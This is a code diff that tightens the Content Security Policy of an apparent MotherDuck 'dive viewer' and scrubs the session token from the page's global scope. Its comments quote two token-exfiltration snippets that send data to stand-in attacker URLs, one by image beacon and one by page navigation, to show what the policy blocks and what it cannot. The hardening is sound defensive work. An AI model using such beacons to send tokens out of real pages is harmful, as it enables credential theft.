@@ -27,14 +27,28 @@ function escapeHtml(s: string): string {
  * regional `*.motherduck.com` connections at runtime; a missing host silently
  * BLANKS the dive with only a CSP console error. Re-verify in a real browser
  * before relying on this, and widen the list if a dive blanks.
+ *
+ * RESIDUAL RISK: a CSP cannot fully contain a token handed to arbitrary code in
+ * the same realm. We block the easy beacon channels (img/style/font, and
+ * connect-src is MotherDuck + the fixed CDNs only), and scrub the raw SLT from
+ * the global scope once the connection captures it. But same-frame navigation
+ * (`location.href = 'https://…/?t=' + data`) is not constrainable via CSP
+ * (`navigate-to` is unimplemented), and a dive that already holds the live DB
+ * connection can still exfiltrate *query results*. The robust fix is
+ * architectural — render untrusted/org-shared dives without a user SLT (e.g.
+ * proxy queries server-side so the browser never holds the token). Tracked as a
+ * known limitation of this sample.
  */
 export const DIVE_VIEWER_CSP = [
   "default-src 'none'",
   "script-src 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://unpkg.com https://esm.sh",
   'connect-src https://*.motherduck.com wss://*.motherduck.com https://esm.sh https://unpkg.com https://cdn.jsdelivr.net',
-  "style-src 'unsafe-inline' https:",
-  "img-src 'self' data: https:",
-  'font-src https: data:',
+  // Lock down non-fetch exfil channels: no blanket `https:`. Images may only
+  // come from data: URIs or MotherDuck (blocks `new Image().src='https://attacker/?t='+token`
+  // beacons); styles inline-only (tailwind injects inline <style>); fonts data: only.
+  "style-src 'unsafe-inline'",
+  'img-src data: https://*.motherduck.com',
+  'font-src data:',
   'worker-src blob:',
   'child-src blob:',
   "form-action 'none'",
@@ -503,6 +517,10 @@ export function buildDiveViewerHtml(params: {
             var __opts = { mdToken: __SLT };
             if (__MD_SERVER_URL) __opts.mdServerURL = __MD_SERVER_URL;
             __connection = window.__MDConnection.create(__opts);
+            // The connection has captured the token internally; scrub the raw
+            // SLT from the global scope so dive code can't read it back off
+            // window.__SLT once the connection exists.
+            try { __SLT = null; __opts.mdToken = null; delete window.__SLT; } catch (e) { /* ignore */ }
             __connection.isInitialized()
               .then(function() { return attachRequiredDatabases(__connection); })
               .then(function() { resolve(__connection); })
